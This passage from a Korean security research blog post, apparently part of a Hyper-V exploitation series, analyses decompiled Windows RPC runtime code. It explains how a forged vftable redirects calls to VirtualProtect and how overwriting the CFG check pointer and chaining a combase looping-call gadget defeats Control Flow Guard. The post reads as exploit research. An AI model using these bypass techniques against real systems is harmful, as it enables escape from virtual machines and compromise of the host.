&#xB54C;&#xBB38;&#xC5D0; &#xD574;&#xB2F9; &#xBD80;&#xBD84;&#xC744; &#xC608;&#xC678; &#xC5C6;&#xC774; &#xC798; &#xD1B5;&#xACFC;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;!</p>
<p>&#xBB34;&#xD2BC; &#xC774;&#xB807;&#xAC8C; <code>RpcMsg-&gt;Buffer</code>&#xC5D0; &#xC788;&#xB294; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC5D0; &#xC0AC;&#xC6A9;&#xB420; &#xC778;&#xC790;&#xB4E4;&#xC774; <code>NdrStubCall2</code>&#xC758; <code>arg</code>&#xAC00; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xC2A4;&#xD0DD;&#xC73C;&#xB85C; &#xBAA8;&#xB450; &#xBCF5;&#xC0AC;&#xB429;&#xB2C8;&#xB2E4;! &#xADF8;&#xB9AC;&#xACE0; &#xB300;&#xB9DD;&#xC758; <code>Invoke</code>&#xAC00; &#xD638;&#xCD9C;&#xB420; &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xC640; &#xC0AC;&#xC6A9;&#xB420; &#xC778;&#xC790;&#xB4E4;&#xC774; &#xC800;&#xC7A5;&#xB41C; &#xBC84;&#xD37C;&#xB97C; &#xC778;&#xC790;&#xB85C; &#xD638;&#xCD9C;&#xB429;&#xB2C8;&#xB2E4;!</p>
<h3 id="Invoke"><a href="#Invoke" class="headerlink" title="Invoke"></a><code>Invoke</code></h3><p>&#xC544;&#xB798;&#xB294; <code>NdrStubCall2</code>&#xC5D0;&#xC11C; <code>Invoke</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xBD80;&#xBD84;&#xC785;&#xB2C8;&#xB2E4;.<br><pre><code class="hljs C">v21 = MIDL2-&gt;ThunkTable;
<span class="hljs-keyword">if</span> ( v21 &amp;&amp; (v58 = (<span class="hljs-keyword">void</span> (__fastcall *)(_MIDL_STUB_MESSAGE *, <span class="hljs-keyword">const</span> STUB_THUNK *, __int64))v21[ProcNum2]) != <span class="hljs-number">0</span>i64 )
{
  v58(&amp;pStubMsg, v21, ProcNum2);
}
<span class="hljs-keyword">else</span>
{
  v105 = <span class="hljs-number">0</span>i64;
  v22 = (<span class="hljs-keyword">const</span> SERVER_ROUTINE *)Msg-&gt;ManagerEpv;
  <span class="hljs-keyword">if</span> ( !v22 )
    v22 = DispatchTable;
  argc = (<span class="hljs-keyword">unsigned</span> __int64)NdrProcContext.StackSize &gt;&gt; <span class="hljs-number">3</span>;
  <span class="hljs-keyword">if</span> ( (_DWORD)argc &amp;&amp; (*(_BYTE *)(NdrProcContext.<span class="hljs-keyword">union</span>.NdrInfo.pProcDesc + <span class="hljs-number">4</span>) &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span> &amp;&amp; (v20 &amp; <span class="hljs-number">8</span>) == <span class="hljs-number">0</span> )
    LODWORD(argc) = argc - <span class="hljs-number">1</span>;
  <span class="hljs-keyword">if</span> ( v7 )
    v24 = *(<span class="hljs-keyword">unsigned</span> __int16 *)(v7 + <span class="hljs-number">8</span>);
  <span class="hljs-keyword">else</span>
    v24 = <span class="hljs-number">0</span>i64;
  v25 = Invoke((__int64 (__fastcall *)(__int64, __int64, __int64, __int64))v22[ProcNum2], args, v24, argc);
  v105 = v25;
  <span class="hljs-keyword">if</span> ( (*(_BYTE *)(NdrProcContext.<span class="hljs-keyword">union</span>.NdrInfo.pProcDesc + <span class="hljs-number">4</span>) &amp; <span class="hljs-number">4</span>) != <span class="hljs-number">0</span> )
  {
    <span class="hljs-keyword">if</span> ( (NdrProcContext.Flags &amp; <span class="hljs-number">8</span>) == <span class="hljs-number">0</span> )
      *(_QWORD *)&amp;args[<span class="hljs-number">8</span> * (<span class="hljs-keyword">int</span>)argc] = v25;
    <span class="hljs-keyword">if</span> ( pThis )
      (*((<span class="hljs-keyword">void</span> (__fastcall **)(PRPC_MESSAGE, _QWORD, _QWORD))pNdrOleExtensionsTable + <span class="hljs-number">4</span>))(
        Msg,
        <span class="hljs-number">0</span>i64,
        (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)v25);
  }
}</code></pre></p>
<p><code>MIDL_SERVER_INFO</code>&#xC758; <code>ThunkTable</code>&#xC774; NULL&#xC774; &#xC544;&#xB2C8;&#xBA74; &#xD638;&#xCD9C;&#xB420; &#xD568;&#xC218;&#xC758; &#xC778;&#xC790;&#xB85C; <code>StubMsg</code>, <code>ThunkTable</code>, <code>ProcNum</code>&#xAC00; &#xC804;&#xB2EC;&#xB418;&#xAE30; &#xB54C;&#xBB38;&#xC5D0; <code>ThunkTable</code>&#xC740; NULL&#xB85C; &#xC124;&#xC815;&#xD574;&#xC57C;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; <code>RpcMsg</code>&#xC758; <code>ManagerEpv</code>&#xB3C4; NULL&#xC774;&#xBA74; <code>MIDL_SERVER_INFO</code>&#xC758; <code>DispatchTable</code>&#xC5D0;&#xC11C; &#xD638;&#xCD9C;&#xB420; &#xD568;&#xC218;&#xB97C; &#xAC00;&#xC838;&#xC635;&#xB2C8;&#xB2E4;.<br><code>Invoke</code>&#xAC00; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xBCF4;&#xBA74; <code>v22[ProcNum]</code>&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xB420; &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xC640; &#xC778;&#xC790;&#xB4E4;&#xC774; &#xC800;&#xC7A5;&#xB41C; &#xBC84;&#xD37C;&#xC758; &#xC8FC;&#xC18C;, &#xC778;&#xC790;&#xC758; &#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD574;&#xC11C; &#xD638;&#xCD9C;&#xD558;&#xACE0; &#xC788;&#xB124;&#xC694;! <code>Invoke</code> &#xB0B4;&#xBD80;&#xC5D0;&#xC120; &#xC5B4;&#xB5A4; &#xB3D9;&#xC791;&#xC774; &#xC774;&#xB8E8;&#xC5B4;&#xC9C8;&#xAE4C;&#xC694;?&#x2026;</p>
<pre><code class="hljs C"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">Invoke</span><span class="hljs-params">(__int64 (__fastcall *a1)(__int64, __int64, __int64, __int64), <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *args, __int64 a3, <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> argc)</span></span>
<span class="hljs-function"></span>{
  <span class="hljs-keyword">void</span> *v4; <span class="hljs-comment">// rsp</span>
  __int64 vars0[<span class="hljs-number">4</span>]; <span class="hljs-comment">// [rsp+0h] [rbp+0h] BYREF</span>

  v4 = alloca(<span class="hljs-number">8</span> * ((argc + <span class="hljs-number">1</span>) &amp; <span class="hljs-number">0xFFFFFFFE</span>));
  qmemcpy(vars0, args, <span class="hljs-number">8</span>i64 * argc);
  RpcInvokeCheckICall(a1);
  <span class="hljs-keyword">return</span> a1(vars0[<span class="hljs-number">0</span>], vars0[<span class="hljs-number">1</span>], vars0[<span class="hljs-number">2</span>], vars0[<span class="hljs-number">3</span>]);
}</code></pre>
<p>&#xC624;&#xB79C;&#xB9CC;&#xC5D0; &#xC9E7;&#xC740; &#xBD84;&#xB7C9;&#xC758; &#xCF54;&#xB4DC;&#xB97C; &#xBCF4;&#xB2C8; &#xAE30;&#xBD84;&#xC774; &#xB9E4;&#xC6B0; &#xC88B;&#xC2B5;&#xB2C8;&#xB2E4;!! &#xC778;&#xC790; &#xC804;&#xB2EC;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xB9CC;&#xD07C;&#xC758; &#xC2A4;&#xD0DD;&#xC744; <code>alloca</code>&#xB85C; &#xCD94;&#xAC00;&#xB85C; &#xD655;&#xC7A5;&#xD55C; &#xB2E4;&#xC74C; <code>qmemcpy</code>&#xB85C; &#xBCF5;&#xC0AC;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xD6C4; <code>RpcInvokeCheckICall</code>&#xB85C; CFG &#xAC80;&#xC0AC;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xAC80;&#xC0AC;&#xB97C; &#xD1B5;&#xACFC;&#xD558;&#xBA74; <del>&#xB4DC;&#xB514;&#xC5B4;</del> &#xC694;&#xCCAD;&#xB41C; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD569;&#xB2C8;&#xB2E4;.</p>
<h3 id="Exit"><a href="#Exit" class="headerlink" title="Exit"></a>Exit</h3><p>&#xC694;&#xCCAD;&#xB41C; &#xD568;&#xC218;&#xAC00; &#xD638;&#xCD9C;&#xB410;&#xB2E4;&#xACE0; &#xB05D;&#xC774; &#xC544;&#xB2C8;&#xC8E0;! &#xB9C8;&#xC9C0;&#xB9C9; &#xBAA9;&#xD45C;&#xB294; <code>NdrStubCall2</code>&#xB97C; <del>&#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xB9DE;&#xC9C0; &#xC54A;&#xACE0;</del> &#xC608;&#xC678; &#xC5C6;&#xC774; &#xB9AC;&#xD134;&#xC2DC;&#xCF1C;&#xC918;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.<br><code>NdrStubCall2</code>&#xC5D0;&#xC11C; <code>Invoke</code>&#xAC00; &#xB9AC;&#xD134;&#xD55C; &#xD6C4; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740; &#xCF54;&#xB4DC;&#xB97C; &#xBCFC; &#xC218; &#xC788;&#xB294;&#xB370;&#xC694;?</p>
<pre><code class="hljs C"><span class="hljs-keyword">if</span> ( !pChannel )
  {
    <span class="hljs-keyword">if</span> ( pStubMsg.IsClient )
    {
      pStubMsg.SavedHandle = <span class="hljs-number">0</span>i64;
      pStubMsg.RpcMsg-&gt;Handle = <span class="hljs-number">0</span>i64;
    }
    pStubMsg.RpcMsg-&gt;BufferLength = (v26 + <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0xFFFFFFFC</span>;
    RpcMsg1 = pStubMsg.RpcMsg;
    v98 = pStubMsg.RpcMsg;
    v122 = <span class="hljs-number">0</span>i64;
    v28 = (BINDING_HANDLE *)pStubMsg.RpcMsg-&gt;Handle;<span class="hljs-comment">//v28 == fake vftable</span>
    <span class="hljs-keyword">if</span> ( pStubMsg.RpcMsg-&gt;Handle
      &amp;&amp; *((_DWORD *)v28 + <span class="hljs-number">2</span>) == <span class="hljs-number">0x89ABCDEF</span>
      &amp;&amp; (v29 = *((_DWORD *)v28 + <span class="hljs-number">3</span>), (v29 &amp; <span class="hljs-number">0x33307C</span>) != <span class="hljs-number">0</span>) )
    {
      v116 = pStubMsg.RpcMsg-&gt;Handle;
      v30 = v29 &amp; <span class="hljs-number">0x202048</span>;
      v96 = v30;
      v101 = pStubMsg.RpcMsg;
      <span class="hljs-keyword">if</span> ( !v30 &amp;&amp; (pStubMsg.RpcMsg-&gt;RpcInterfaceInformation-&gt;Flags &amp; <span class="hljs-number">0x2000000</span>) != <span class="hljs-number">0</span> )
      {
        v34 = (*(__int64 (__fastcall **)(BINDING_HANDLE *, PRPC_MESSAGE, _QWORD))(*(_QWORD *)v28 + <span class="hljs-number">0x70</span>i64))(
                v28,
                pStubMsg.RpcMsg,
                <span class="hljs-number">0</span>i64);
        <span class="hljs-keyword">goto</span> LABEL_56;
      }
      v31 = (__int64)NtCurrentTeb()-&gt;ReservedForNtRpc;
      v115 = v31;
      <span class="hljs-keyword">if</span> ( v31 )
      {
        v32 = (struct THREAD *)(v31 ^ <span class="hljs-number">0xABABABABDEDEDEDE</span>ui64);
        v115 = (__int64)v32;
        v123 = NtCurrentTeb();
        <span class="hljs-keyword">if</span> ( (HANDLE)*((_QWORD *)v32 + <span class="hljs-number">2</span>) != v123-&gt;ClientId.UniqueThread )
          __fastfail(<span class="hljs-number">0x1E</span>u);
        <span class="hljs-keyword">if</span> ( v32 )
          <span class="hljs-keyword">goto</span> LABEL_217;
      }
      v32 = ThreadSelfHelper();
      <span class="hljs-keyword">if</span> ( v32 )
      {
LABEL_217:
        <span class="hljs-keyword">if</span> ( *((_QWORD *)v32 + <span class="hljs-number">10</span>) )
        {
          FreeEEInfoChain();
          *((_QWORD *)v32 + <span class="hljs-number">10</span>) = <span class="hljs-number">0</span>i64;
        }
        RpcMsg1-&gt;ProcNum &amp;= <span class="hljs-number">0xFFFF7FFF</span>;
        <span class="hljs-keyword">if</span> ( !v30 )                             <span class="hljs-comment">// !v30 =&gt; 0</span>
        {
          <span class="hljs-keyword">if</span> ( (*((_DWORD *)v28 + <span class="hljs-number">3</span>) &amp; <span class="hljs-number">0x130010</span>) != <span class="hljs-number">0</span> &amp;&amp; (Microsoft_Windows_RPCEnableBits &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )<span class="hljs-comment">// avoid here</span>
          {
            v59 = BINDING_HANDLE::GetImpersonationLevel(v28);
            v60 = BINDING_HANDLE::GetAuthenticationService(v28);
            v61 = BINDING_HANDLE::GetAuthenticationLevel(v28);
            v62 = (*(__int64 (__fastcall **)(BINDING_HANDLE *))(*(_QWORD *)v28 + <span class="hljs-number">344</span>i64))(v28);
            v63 = (*(__int64 (__fastcall **)(BINDING_HANDLE *))(*(_QWORD *)v28 + <span class="hljs-number">336</span>i64))(v28);
            v64 = (*(__int64 (__fastcall **)(BINDING_HANDLE *))(*(_QWORD *)v28 + <span class="hljs-number">328</span>i64))(v28);
            v65 = (*(__int64 (__fastcall **)(BINDING_HANDLE *))(*(_QWORD *)v28 + <span class="hljs-number">320</span>i64))(v28);
            v94 = v62;
            RpcMsg1 = v98;
            McTemplateU0jqqzzzqqq(
              v66,
              (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)&amp;RpcClientCallStartEvent,
              &amp;v101-&gt;RpcInterfaceInformation-&gt;InterfaceId,
              v98-&gt;ProcNum,
              v65,
              v64,
              v63,
              v94,
              v61,
              v60,
              v59);
            v30 = v96;
          }
          v36 = (*(__int64 (__fastcall **)(BINDING_HANDLE *, PRPC_MESSAGE))(*(_QWORD *)v28 + <span class="hljs-number">0x68</span>i64))(v28, RpcMsg1);<span class="hljs-comment">// make corrupted vftable[0] + 0x68 points VirtualProtect in DispatchTable</span>
          <span class="hljs-keyword">if</span> ( v36 )
            <span class="hljs-keyword">goto</span> LABEL_57;
          v28 = (BINDING_HANDLE *)RpcMsg1-&gt;Handle;
          v116 = RpcMsg1-&gt;Handle;
        }
        v33 = *(__int64 (__fastcall **)(OSF_SCALL *__hidden, struct _RPC_MESSAGE *, struct _GUID *))(*(_QWORD *)v28 + <span class="hljs-number">0x70</span>i64);<span class="hljs-comment">// call RpcMsg-&gt;Handle[0] + 0x70 =&gt; VirtualProtect</span>
        <span class="hljs-keyword">if</span> ( v33 == OSF_SCALL::GetBuffer )
        {
          v34 = OSF_SCALL::GetBuffer(v28, RpcMsg1, <span class="hljs-number">0</span>i64);
        }
        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> ( v33 == LRPC_SCALL::GetBuffer )
        {
          v34 = LRPC_SCALL::GetBuffer(v28, RpcMsg1, <span class="hljs-number">0</span>i64);
        }
        <span class="hljs-keyword">else</span>
        {
          v34 = v33(v28, RpcMsg1, <span class="hljs-number">0</span>i64);        <span class="hljs-comment">// make corrupted vftable[0] + 0x70 points VirtualProtect in DispatchTable</span>
        }
LABEL_56:
        v36 = v34;
LABEL_57:
        <span class="hljs-keyword">if</span> ( !v30 &amp;&amp; v36 )
        {
          <span class="hljs-keyword">if</span> ( (Microsoft_Windows_RPCEnableBits &amp; <span class="hljs-number">2</span>) != <span class="hljs-number">0</span> )
            McTemplateU0q(v35, &amp;RpcClientCallEndEvent, v36);
          <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)IsEEInfoEtwEnabled() )
            LogEEInfoToEtw();
        }
        <span class="hljs-keyword">goto</span> LABEL_58;
      }
      v36 = <span class="hljs-number">14</span>;
    }
    <span class="hljs-keyword">else</span>
    {
      v36 = <span class="hljs-number">0x6A6</span>;
    }
LABEL_58:
    <span class="hljs-keyword">if</span> ( v36 )
    {
      <span class="hljs-keyword">if</span> ( pStubMsg.pAsyncMsg &amp;&amp; pStubMsg.IsClient )
        *((_WORD *)pStubMsg.pAsyncMsg + <span class="hljs-number">8</span>) |= <span class="hljs-number">8u</span>;
      RpcRaiseException(v36);
    }
    pStubMsg.Buffer = (<span class="hljs-keyword">unsigned</span> __int8 *)pStubMsg.RpcMsg-&gt;Buffer;
    v37 = (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)pStubMsg._bf_c0;
    LODWORD(v37) = pStubMsg._bf_c0 | <span class="hljs-number">0x200</span>;
    pStubMsg._bf_c0 |= <span class="hljs-number">0x200</span>u;
    <span class="hljs-keyword">goto</span> LABEL_60;
  }</code></pre>
<p><code>v28</code>&#xC774; &#xC870;&#xC791;&#xB41C; vftable&#xC758; &#xC8FC;&#xC18C;&#xB97C; &#xAC00;&#xB9AC;&#xD0A4;&#xAC8C; &#xB418;&#xACE0; &#xB9E4;&#xC6B0; &#xBCF5;&#xC7A1;&#xD574; &#xBCF4;&#xC774;&#xB294; &#xC870;&#xAC74;&#xC744; &#xAC00;&#xC9C4; if&#xBB38;&#xACFC; &#xB9CC;&#xB098;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xBCF5;&#xC7A1;&#xD574; &#xBCF4;&#xC778;&#xB2E4;&#xACE0; &#xADF8;&#xB0E5; &#xC870;&#xAC74;&#xC744; &#xBB34;&#xC2DC;&#xD574;&#xC11C; else&#xB85C; &#xBD84;&#xAE30;&#xD558;&#xAC8C; &#xB418;&#xBA74; <code>v36</code>&#xC774; 0x6a6&#xC73C;&#xB85C; &#xC124;&#xC815;&#xB418;&#xB294;&#xB370;&#xC694;? &#xBC14;&#xB85C; &#xB2E4;&#xC74C; if &#xBB38;&#xC744; &#xBCF4;&#xC2DC;&#xBA74; <code>v36</code>&#xC774; 0&#xC774; &#xC544;&#xB2C8;&#xBA74; &#xC584;&#xC9E4; &#xC5C6;&#xC774; <code>RpcRaiseException</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xBA74;&#xC11C; &#xC608;&#xC678;&#xB97C; &#xC5BB;&#xC5B4;&#xB9DE;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. <del><code>NdrStubCall2</code>: &#xC790;&#xC138;&#xD788; &#xC548; &#xBCFC;&#xAC70;&#xC57C;? &#x3147;&#x314B;&#x3147;&#x314B; &#xD130;&#xC9C8;&#xAC8C;</del><br>&#xB2E4; &#xB410;&#xB2E4;&#xACE0; &#xC0DD;&#xAC01;&#xD55C; &#xC2DC;&#xC810;&#xC5D0;&#xC11C; &#xD06C;&#xB798;&#xC2DC;&#xB97C; &#xB9DE;&#xACE0; &#xB2E4;&#xC2DC; &#xD55C; &#xBC88; &#xC88C;&#xC808;&#xAC10;&#xC744; &#xB9DB; &#xBCF8; &#xC800;&#xB294; &#xC870;&#xAC74;&#xC744; &#xB9DE;&#xCDB0; &#xC8FC;&#xB824;&#xACE0; &#xAC00;&#xC9DC; vftable&#xC758; &#xB450; &#xBC88;&#xC9F8; &#xC5D4;&#xD2B8;&#xB9AC;&#xB97C; 0x33307c89abcdef&#xB85C; &#xC124;&#xC815;&#xD574;&#xC11C; if&#xBB38;&#xC73C;&#xB85C; &#xBD84;&#xAE30;&#xD558;&#xAC8C; &#xB9CC;&#xB4E4;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB9AC;&#xACE0; <code>NdrpServerUnMarshal</code>&#xB54C;&#xCC98;&#xB7FC; <code>v33 = *(__int64 (__fastcall **)(OSF_SCALL *__hidden, struct _RPC_MESSAGE *, struct _GUID *))(*(_QWORD *)v28 + 0x70i64);</code>&#xB85C; &#xC5BB;&#xC5B4;&#xC9C4; &#xD568;&#xC218;&#xC758; &#xC8FC;&#xC18C;&#xB97C; <code>VirtualProtect</code>&#xB85C; &#xB9CC;&#xB4E4;&#xC5B4;&#xC918; <code>v34 = v33(v28, RpcMsg1, 0i64);</code>&#xC5D0;&#xC11C; 0&#xC774; &#xBC18;&#xD658;&#xB418;&#xC5B4; <code>RpcRaiseException</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xB294; &#xBD80;&#xBD84;&#xC744; &#xD53C;&#xD560; &#xC218; &#xC788;&#xC5C8;&#xACE0; <code>NdrStubCall2</code> &#xBB34;&#xC0AC;&#xD788; &#xBC18;&#xD658;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;&#x2026;</p>
<p>&#xC9C0;&#xAE08;&#xAE4C;&#xC9C0; <code>NdrServerCall2</code>&#xC744; &#xBD84;&#xC11D;&#xD574;&#xBCF4;&#xBA70; &#xC784;&#xC758;&#xC758; &#xD568;&#xC218;&#xB97C; &#xC784;&#xC758;&#xC758; &#xC778;&#xC790;&#xB85C; &#xC548;&#xC804;&#xD558;&#xAC8C;(?) &#xD638;&#xCD9C;&#xD558;&#xB294; &#xBC29;&#xBC95;&#xC744; &#xC54C;&#xC544;&#xBD24;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC774; &#xACFC;&#xC815;&#xC744; &#xC54C;&#xC544;&#xB0B4;&#xAE30;&#xAE4C;&#xC9C0; &#xC800;&#xC758; &#xAC00;&#xC0C1;&#xBA38;&#xC2E0;&#xC774; &#xACAA;&#xC5C8;&#xC744; &#xC218;&#xB9CE;&#xC740; &#xC2A4;&#xB0C5;&#xC0F7; &#xBCF5;&#xC6D0;&#xC5D0; &#xB9C8;&#xC74C;&#xC774; &#xC544;&#xD504;&#xB124;&#xC694;</p>
<p><img src="/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image3.png" srcset="/img/loading.gif" alt></p>
<h2 id="Neutralizing-CFG"><a href="#Neutralizing-CFG" class="headerlink" title="Neutralizing CFG"></a>Neutralizing CFG</h2><p>&#xADF8;&#xB798;&#xC11C; &#xC774;&#xAC70;&#xB85C; &#xC5B4;&#xB5BB;&#xAC8C; CFG&#xB97C; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xC744;&#xAE4C;&#xC694;?  &#xBA3C;&#xC800; <code>Invoke</code>&#xC5D0;&#xC11C; CFG &#xCCB4;&#xD06C;&#xB97C; &#xC704;&#xD574; &#xD638;&#xCD9C;&#xB418;&#xB294; <code>RpcInvokeCheckICall</code>&#xC744; &#xBCF4;&#xBA74; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC740;&#xB370;&#xC694;?<br><img src="/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image4.png" srcset="/img/loading.gif" alt><br><code>rpcrt4!__guard_check_icall_fptr</code>&#xC774; &#xAC00;&#xB9AC;&#xD0A4;&#xB294; &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC744; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xB9CC;&#xC57D; <code>rpcrt4!__guard_check_icall_fptr</code>&#xC5D0; &#xC4F0;&#xAE30; &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD558;&#xACE0; &#xBC14;&#xB85C; <code>ret</code> &#xBA85;&#xB839;&#xC744; &#xC218;&#xD589;&#xD558;&#xB294; &#xC8FC;&#xC18C;&#xB85C; &#xB36E;&#xC5B4;&#xC4F4; &#xB2E4;&#xBA74; &#xC5B4;&#xB5BB;&#xAC8C; &#xB420;&#xAE4C;&#xC694;? CFG&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB294; &#xB418;&#xC5B4; &#xC788;&#xC9C0;&#xB9CC; <code>ntdll!LdrpValidateUserCallTarget</code>&#xC774; &#xD638;&#xCD9C;&#xB418;&#xC9C0; &#xC54A;&#xC544; CFG&#xAC00; &#xC788;&#xC73C;&#xB098; &#xB9C8;&#xB098;&#xC778; &#xC0C1;&#xD0DC;&#xAC00; &#xB418;&#xC5B4;&#xBC84;&#xB9BD;&#xB2C8;&#xB2E4;!! &#xB2E4;&#xD589;&#xD788; <code>VirtualProtect</code>&#xB294; &#xAC04;&#xC811; &#xD638;&#xCD9C;&#xC744; &#xD558;&#xB354;&#xB77C;&#xB3C4; CFG&#xC5D0; &#xAC78;&#xB9AC;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;! &#xD558;&#xC9C0;&#xB9CC; &#xC704; &#xB3D9;&#xC791;&#xC744; &#xD558;&#xAE30; &#xC704;&#xD574;&#xC120; &#xC801;&#xC5B4;&#xB3C4; &#xC138; &#xBC88;&#xC758; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC740; &#xD544;&#xC694;&#xD560; &#xAC83;&#xC785;&#xB2C8;&#xB2E4;. &#xB2E4;&#xD589;&#xD788; &#xAC04;&#xC811; &#xD638;&#xCD9C;&#xC744; &#xBC18;&#xBCF5;&#xD560; &#xC218; &#xC788;&#xB294; &#xAC00;&#xC82F;&#xC774; <code>combase.dll</code>&#xC5D0; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;! </p>
<h2 id="Loop-Indirect-Call"><a href="#Loop-Indirect-Call" class="headerlink" title="Loop Indirect Call"></a>Loop Indirect Call</h2><p>&#xC544;&#xB798;&#xB294; <code>combase!RegistrationStore::Context</code>&#xC758; <code>RevertChanges</code>&#xB77C;&#xB294; &#xBA54;&#xC18C;&#xB4DC;&#xC785;&#xB2C8;&#xB2E4;.<br><img src="/2023/10/30/pwndorei/newjeans-hyper-v-pt5/image5.png" srcset="/img/loading.gif" alt><br><code>Context+0xb0</code>&#xC5D0; &#xC704;&#xCE58;&#xD55C; <code>_List_ENTRY</code>&#xB85C; &#xC774;&#xB8E8;&#xC5B4;&#xC9C4; &#xC5F0;&#xACB0;&#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; <code>Blink</code>&#xBC29;&#xD5A5;&#xC73C;&#xB85C; &#xC21C;&#xD68C;&#xD558;&#xBA74;&#xC11C; vftable+0x70&#xC5D0; &#xC800;&#xC7A5;&#xB41C; &#xC8FC;&#xC18C;&#xB97C; &#xBC18;&#xBCF5;&#xC801;&#xC73C;&#xB85C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xC5F0;&#xACB0; &#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xB824;&#xBA74; &#xD799; &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xC544;&#xC57C; &#xD558;&#xB294;&#xB370; &#xC774;&#xB294; <code>VideoDirtListener + 0x58</code>&#xC5D0; <code>VideoDirtListener</code>&#xC758; &#xC8FC;&#xC18C;&#xAC00; &#xC800;&#xC7A5;&#xB418;&#xC5B4; &#xC788;&#xC5B4;&#xC11C; &#xC27D;&#xAC8C; &#xC54C;&#xC544;&#xB0BC; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; <code>Blink</code>&#xAC00; <code>RPC_MESSAGE</code>&#xC758; &#xB2E4;&#xB978; &#xC911;&#xC694;&#xD55C; &#xD544;&#xB4DC;&#xC640; &#xC624;&#xD504;&#xC14B;&#xC774; &#xACB9;&#xCE58;&#xC9C0; &#xC54A;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;<br>&#xC5EC;&#xB7EC; &#xAC1C;&#xC758; &#xB178;&#xB4DC;&#xB4E4;&#xB85C; &#xC5F0;&#xACB0;&#xB9AC;&#xC2A4;&#xD2B8;&#xB97C; &#xAD6C;&#xC131;&#xD558;&#xACE0; &#xC774; &#xAC00;&#xC82F;&#xC744; &#xD65C;&#xC6A9;&#xD574;&#xC11C; &#xAC01;&#xAC01;&#xC758; &#xB178;&#xB4DC;&#xB4E4;&#xC744; &#xC21C;&#xD68C;&#xD558;&#xBA70; &#xC2A4;&#xC2A4;&#xB85C;&#xB97C; &#xC778;&#xC790;(<code>RPC_MESSAGE</code>)&#xB85C; &#xC0BC;&#xC544; <code>NdrServerCall2</code>&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xB610;&#xD55C; &#xAC01;&#xAC01;&#xC758; &#xB178;&#xB4DC;(<code>RPC_MESSAGE</code>)&#xC5D0;&#xC11C;&#xB294; &#xAC19;&#xC740; <code>RPC_SERVER_INTERFACE</code>&#xC640; <code>MIDL_SERVER_INFO</code>, <code>DispatchTable</code>&#xACFC; <code>vftable</code>&#xC744; &#xACF5;&#xC720;&#xD560; &#xC218; &#xC788;&#xC5B4;&#xC11C; <del>&#xC2EC;&#xAC01;&#xD560; &#xC815;&#xB3C4;&#xB85C;</del> &#xBCF5;&#xC7A1;&#xD574;&#xC9C0;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.<br>&#xADF8;&#xB7FC; &#xC774;&#xC81C; &#xC5B4;&#xB5A4; &#xD568;&#xC218; &#xD638;&#xCD9C;&#xB85C; CFG&#xB97C; &#xBB34;&#xB825;&#xD654;&#xD560;&#xC9C0; &#xC54C;&#xC544;&#xBCF4;&#xC2DC;&#xC8E0;</p>
